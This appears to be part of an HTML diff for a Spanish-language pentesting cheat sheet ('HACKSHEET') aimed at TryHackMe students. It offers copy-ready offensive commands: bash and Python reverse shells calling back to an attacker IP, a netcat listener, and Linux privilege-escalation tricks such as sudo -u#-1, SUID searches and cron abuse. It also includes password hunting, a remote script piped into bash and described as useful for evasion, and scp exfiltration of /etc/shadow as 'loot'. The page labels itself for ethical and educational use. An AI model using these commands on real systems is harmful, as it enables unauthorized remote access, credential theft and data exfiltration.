+        <div class="explanation-text">Genera un ejecutable malicioso (payload) que, al ejecutarse en la víctima, se conecta de vuelta a tu máquina (reverse shell). <b style="color:var(--blue)">-f elf</b> para Linux, usa <b style="color:var(--blue)">exe</b> para Windows, <b style="color:var(--blue)">apk</b> para Android.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">msfvenom</span><span class="tag">payload</span><span class="tag">reverse-tcp</span>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="subsection-title">REVERSE SHELLS — Netcat & Bash</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Netcat — Escuchar (Atacante)</span>
+        <span class="risk-badge risk-low">LISTENER</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>nc <span class="hl-flag">-lvnp</span> <span class="hl-opt">4444</span>
+<span class="prompt"># También con rlwrap para mejor UX:</span>
+<span class="prompt">$ </span>rlwrap nc <span class="hl-flag">-lvnp</span> <span class="hl-opt">4444</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nc -lvnp 4444')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Pone tu máquina en "modo escucha" esperando que alguien se conecte al puerto 4444. <b style="color:var(--blue)">-l</b> escucha, <b style="color:var(--blue)">-v</b> modo verbose, <b style="color:var(--blue)">-n</b> sin DNS, <b style="color:var(--blue)">-p</b> puerto. Cuando la víctima ejecuta la reverse shell, aparece una conexión aquí.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">netcat</span><span class="tag">listener</span><span class="tag">nc</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Bash Reverse Shell (Víctima)</span>
+        <span class="risk-badge risk-high">REVERSE SHELL</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>bash -i >& /dev/tcp/<span class="hl-host">10.9.0.1</span>/<span class="hl-opt">4444</span> 0>&1</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'bash -i >& /dev/tcp/10.9.0.1/4444 0>&1')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Ejecutado en la máquina víctima, abre una bash interactiva (<b style="color:var(--blue)">-i</b>) y redirige su entrada/salida hacia tu IP y puerto. En esencia: "la máquina víctima llama a tu máquina y te da su terminal".</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">bash</span><span class="tag">reverse-shell</span><span class="tag">linux</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Python Reverse Shell</span>
+        <span class="risk-badge risk-high">REVERSE SHELL</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>python3 -c <span class="hl-str">'import socket,os,pty;s=socket.socket();s.connect(("10.9.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, `python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.9.0.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'`)">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Reverse shell en Python, útil cuando bash no está disponible o está restringida. Crea un socket TCP, se conecta al atacante y redirige stdin/stdout/stderr. <b style="color:var(--blue)">pty.spawn</b> da una shell TTY completa.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">python3</span><span class="tag">pty</span><span class="tag">tty</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Mejorar Shell (TTY Completa)</span>
+        <span class="risk-badge risk-low">POST-SHELL</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># En la shell recibida:</span>
+<span class="prompt">$ </span>python3 -c <span class="hl-str">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="prompt">$ </span>export TERM=xterm
+<span class="prompt"># Ctrl+Z  →  background shell</span>
+<span class="prompt">$ </span>stty raw -echo; fg</pre>
+        <button class="copy-btn" onclick="copyCmd(this, `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm`)">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Las reverse shells básicas son "tontas" (sin autocompletado, sin Ctrl+C). Estos comandos las "mejoran" a una TTY completa donde funcionan los comandos interactivos (vim, su, ssh, etc.) y el historial.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">TTY</span><span class="tag">stty</span><span class="tag">upgrade</span>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════ PRIVILEGE ESCALATION ═══════════════ -->
+<section class="section" id="privesc">
+  <div class="section-header">
+    <span class="section-icon" style="color:#ffd700">🔑</span>
+    <div>
+      <div class="section-title" style="color:var(--yellow)">PRIVILEGE ESCALATION</div>
+      <div class="section-desc">// De usuario normal a root — Escalada de privilegios Linux</div>
+    </div>
+  </div>
+
+  <div class="subsection-title">ENUMERACIÓN DEL SISTEMA</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Info Básica del Sistema</span>
+        <span class="risk-badge risk-low">RECONOCIMIENTO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>id && whoami
+<span class="prompt">$ </span>uname -a
+<span class="prompt">$ </span>cat /etc/os-release
+<span class="prompt">$ </span>cat /etc/passwd | grep -v nologin</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'id && whoami\nuname -a\ncat /etc/os-release')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">id</b>: muestra tu usuario y grupos actuales. <b style="color:var(--blue)">uname -a</b>: versión del kernel (puede tener exploits públicos). <b style="color:var(--blue)">passwd</b>: lista usuarios del sistema (busca cuentas interesantes).</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">enum</span><span class="tag">kernel</span><span class="tag">usuarios</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Permisos SUDO</span>
+        <span class="risk-badge risk-high">PRIVESC</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>sudo -l
+<span class="prompt">$ </span>sudo -u<span class="hl-opt">#-1</span> /bin/bash
+<span class="prompt">$ </span>sudo /bin/bash</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'sudo -l')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text"><b style="color:var(--blue)">sudo -l</b> muestra qué comandos puedes ejecutar como root. Si ves algo como <b style="color:var(--blue)">(ALL) NOPASSWD: /bin/vim</b>, puedes usarlo para escalar a root. Consulta GTFOBins para saber cómo abusar de cada binario.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">sudo</span><span class="tag">GTFOBins</span><span class="tag">NOPASSWD</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Buscar Archivos SUID</span>
+        <span class="risk-badge risk-high">SUID</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>find / <span class="hl-flag">-perm -4000</span> <span class="hl-flag">-type f</span> 2>/dev/null
+<span class="prompt">$ </span>find / <span class="hl-flag">-perm -u=s</span> <span class="hl-flag">-type f</span> 2>/dev/null</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'find / -perm -4000 -type f 2>/dev/null')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Busca en todo el sistema archivos con el bit SUID activado. Un archivo SUID se ejecuta con los permisos de su propietario (normalmente root), aunque lo lance un usuario sin privilegios. <b style="color:var(--blue)">2>/dev/null</b> oculta los errores de permiso.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">SUID</span><span class="tag">find</span><span class="tag">root</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Cron Jobs y Tareas Programadas</span>
+        <span class="risk-badge risk-med">CRON</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>cat /etc/crontab
+<span class="prompt">$ </span>crontab -l
+<span class="prompt">$ </span>ls -la /etc/cron*
+<span class="prompt">$ </span>cat /var/spool/cron/crontabs/*</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'cat /etc/crontab\ncrontab -l\nls -la /etc/cron*')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Muestra las tareas programadas del sistema. Si hay un script ejecutado por root con permisos de escritura para tu usuario, puedes modificarlo para que ejecute tu código como root la próxima vez que corra.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">cron</span><span class="tag">scheduled</span><span class="tag">wildcard</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Archivos con Contraseñas</span>
+        <span class="risk-badge risk-med">PASSWORDS</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt">$ </span>find / <span class="hl-flag">-name</span> <span class="hl-str">"*.conf"</span> 2>/dev/null | xargs grep -l <span class="hl-str">"password"</span>
+<span class="prompt">$ </span>find / <span class="hl-flag">-name</span> <span class="hl-str">"*.txt"</span> 2>/dev/null | xargs grep -il <span class="hl-str">"pass"</span>
+<span class="prompt">$ </span>history</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'find / -name "*.conf" 2>/dev/null | xargs grep -l "password"')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Busca en archivos de configuración y texto palabras clave como "password". Es sorprendente cuántas veces hay contraseñas hardcodeadas en configs. <b style="color:var(--blue)">history</b> revisa comandos ejecutados anteriormente — muchas veces contienen credenciales.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">passwords</span><span class="tag">grep</span><span class="tag">config</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">LinPEAS / LinEnum (Auto-Enum)</span>
+        <span class="risk-badge risk-high">AUTOMÁTICO</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># Descargar y ejecutar LinPEAS:</span>
+<span class="prompt">$ </span>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span class="prompt"># O transferirlo y ejecutarlo:</span>
+<span class="prompt">$ </span>chmod +x linpeas.sh && ./linpeas.sh</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">LinPEAS es el script de enumeración automática más usado en CTFs. Comprueba automáticamente cientos de vectores de escalada de privilegios y colorea los hallazgos por peligrosidad. Lo que es rojo/amarillo, examínalo primero.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">LinPEAS</span><span class="tag">PEASS</span><span class="tag">automático</span>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════ FILE TRANSFER ═══════════════ -->
+<section class="section" id="filetransfer">
+  <div class="section-header">
+    <span class="section-icon" style="color:#00d4ff">📦</span>
+    <div>
+      <div class="section-title" style="color:var(--blue)">TRANSFERENCIA DE ARCHIVOS</div>
+      <div class="section-desc">// Mover herramientas y datos entre máquinas</div>
+    </div>
+  </div>
+
+  <div class="subsection-title">PYTHON HTTP SERVER</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Servidor HTTP Instantáneo</span>
+        <span class="risk-badge risk-low">SERVIDOR</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># En tu máquina (atacante) — comparte el directorio actual:</span>
+<span class="prompt">$ </span>python3 -m http.server <span class="hl-opt">8080</span>
+<span class="prompt"># Python 2 (legacy):</span>
+<span class="prompt">$ </span>python -m SimpleHTTPServer <span class="hl-opt">8080</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'python3 -m http.server 8080')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Levanta un servidor web en tu máquina que sirve todos los archivos del directorio actual. Desde la víctima puedes descargarte herramientas (LinPEAS, exploits) con <b style="color:var(--blue)">wget</b> o <b style="color:var(--blue)">curl</b>.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">python</span><span class="tag">http</span><span class="tag">servidor</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Descargar desde la Víctima</span>
+        <span class="risk-badge risk-low">DESCARGA</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># En la máquina víctima:</span>
+<span class="prompt">$ </span>wget http://<span class="hl-host">10.9.0.1</span>:8080/<span class="hl-str">linpeas.sh</span>
+<span class="prompt">$ </span>curl -O http://<span class="hl-host">10.9.0.1</span>:8080/<span class="hl-str">exploit.py</span>
+<span class="prompt">$ </span>curl http://<span class="hl-host">10.9.0.1</span>:8080/<span class="hl-str">shell.sh</span> | bash</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'wget http://10.9.0.1:8080/linpeas.sh\ncurl -O http://10.9.0.1:8080/exploit.py')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Descarga archivos desde tu servidor HTTP a la máquina víctima. <b style="color:var(--blue)">wget</b> y <b style="color:var(--blue)">curl -O</b> guardan el archivo. El último ejemplo ejecuta el script directamente sin guardarlo en disco (útil para evasión).</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">wget</span><span class="tag">curl</span><span class="tag">descarga</span>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="subsection-title">SCP — Secure Copy Protocol</div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">SCP — Subir Archivo al Objetivo</span>
+        <span class="risk-badge risk-low">UPLOAD</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># Desde tu máquina → a la víctima:</span>
+<span class="prompt">$ </span>scp <span class="hl-str">linpeas.sh</span> <span class="hl-opt">usuario</span>@<span class="hl-host">10.10.10.1</span>:<span class="hl-str">/tmp/</span>
+<span class="prompt"># Con clave SSH:</span>
+<span class="prompt">$ </span>scp <span class="hl-flag">-i</span> <span class="hl-str">id_rsa</span> <span class="hl-str">archivo.sh</span> <span class="hl-opt">usuario</span>@<span class="hl-host">10.10.10.1</span>:<span class="hl-str">/tmp/</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'scp linpeas.sh usuario@10.10.10.1:/tmp/')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Copia un archivo de tu máquina a la víctima de forma segura por SSH. Necesitas credenciales SSH válidas. La sintaxis es <b style="color:var(--blue)">scp [origen] [usuario@ip:/destino]</b>. Muy útil cuando tienes SSH pero no HTTP.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">SCP</span><span class="tag">SSH</span><span class="tag">upload</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">SCP — Descargar Archivo de la Víctima</span>
+        <span class="risk-badge risk-low">DOWNLOAD</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># De la víctima → a tu máquina local:</span>
+<span class="prompt">$ </span>scp <span class="hl-opt">usuario</span>@<span class="hl-host">10.10.10.1</span>:<span class="hl-str">/etc/shadow</span> <span class="hl-str">./shadow_copia</span>
+<span class="prompt"># Descargar directorio completo (-r):</span>
+<span class="prompt">$ </span>scp <span class="hl-flag">-r</span> <span class="hl-opt">usuario</span>@<span class="hl-host">10.10.10.1</span>:<span class="hl-str">/opt/backups/</span> <span class="hl-str">./loot/</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'scp usuario@10.10.10.1:/etc/shadow ./shadow_copia')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Descarga archivos de la víctima a tu máquina local. Útil para extraer "loot" (datos encontrados): contraseñas, configs, llaves SSH... <b style="color:var(--blue)">-r</b> descarga carpetas enteras recursivamente.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">SCP</span><span class="tag">loot</span><span class="tag">exfiltración</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Netcat — Transferencia de Archivos</span>
+        <span class="risk-badge risk-low">NETCAT</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># Receptor (víctima) escucha:</span>
+<span class="prompt">$ </span>nc <span class="hl-flag">-lvnp</span> <span class="hl-opt">9999</span> > <span class="hl-str">archivo_recibido.sh</span>
+<span class="prompt"># Emisor (atacante) envía:</span>
+<span class="prompt">$ </span>nc <span class="hl-host">10.10.10.1</span> <span class="hl-opt">9999</span> < <span class="hl-str">linpeas.sh</span></pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'nc -lvnp 9999 > archivo_recibido.sh')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Transfiere archivos usando Netcat cuando no hay SSH ni HTTP. El receptor escucha en un puerto y redirige lo que llega a un archivo. El emisor abre una conexión y envía el contenido del archivo. Rápido y sin autenticación.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">netcat</span><span class="tag">no-auth</span><span class="tag">rápido</span>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="card-header">
+        <span class="card-title">Base64 — Transferencia sin Red</span>
+        <span class="risk-badge risk-low">ENCODE</span>
+      </div>
+      <div class="code-block">
+        <pre><span class="prompt"># Codificar en atacante:</span>
+<span class="prompt">$ </span>base64 <span class="hl-str">linpeas.sh</span> > <span class="hl-str">linpeas.b64</span>
+<span class="prompt"># Pegar el texto b64 en víctima y decodificar:</span>
+<span class="prompt">$ </span>echo "<span class="hl-str">BASE64_DATA</span>" | base64 -d > <span class="hl-str">linpeas.sh</span>
+<span class="prompt">$ </span>chmod +x linpeas.sh</pre>
+        <button class="copy-btn" onclick="copyCmd(this, 'base64 linpeas.sh > linpeas.b64\necho "BASE64_DATA" | base64 -d > linpeas.sh')">📋 COPIAR</button>
+      </div>
+      <div class="card-explanation">
+        <div class="explanation-label">¿Qué hace?</div>
+        <div class="explanation-text">Convierte un archivo binario/script a texto Base64, que puedes copiar-pegar directamente en la terminal de la víctima. Útil cuando no tienes conexión directa pero sí un webshell o consola limitada. No necesita red adicional.</div>
+      </div>
+      <div class="card-tags">
+        <span class="tag">base64</span><span class="tag">encode</span><span class="tag">webshell</span>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div>HACKSHEET v2.0 — <span>// Solo para uso ético y educativo</span></div>
+  <div style="margin-top:0.5rem;">Hecho para la comunidad de <span>TryHackMe</span> & estudiantes de <span>Ethical Hacking</span></div>
+</footer>
+
+</div>
+
+<!-- TOAST -->
+<div id="toast">✓ COPIADO AL PORTAPAPELES</div>
+
+<script>
+// ═══ MATRIX RAIN ═══
+(function() {
+  const canvas = document.getElementById('matrix-bg');
+  const ctx = canvas.getContext('2d');
+  let cols, drops;
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    cols = Math.floor(canvas.width / 20);
+    drops = Array(cols).fill(1);
+  }
+
+  resize();
+  window.addEventListener('resize', resize);
+
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>{}[]|\\/@#$%^&*-+=/';
+
+  function draw() {
+    ctx.fillStyle = 'rgba(5,10,5,0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41';
+    ctx.font = '14px Share Tech Mono';
+    drops.forEach((y, x) => {
+      ctx.fillText(chars[Math.floor(Math.random() * chars.length)], x * 20, y * 20);
+      if (y * 20 > canvas.height && Math.random() > 0.975) drops[x] = 0;
+      drops[x]++;
+    });
+  }
+
+  setInterval(draw, 60);
+})();
+
+// ═══ NAV TABS ═══
+function showSection(id, btn) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ═══ COPY TO CLIPBOARD ═══
+function copyCmd(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ COPIADO';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = '📋 COPIAR';
+      btn.classList.remove('copied');
+    }, 2000);
+
+    const toast = document.getElementById('toast');
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2500);
+  }).catch(() => {
+    // Fallback
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.textContent = '✓ COPIADO';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = '📋 COPIAR';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+</script>
+</body>
+</html>
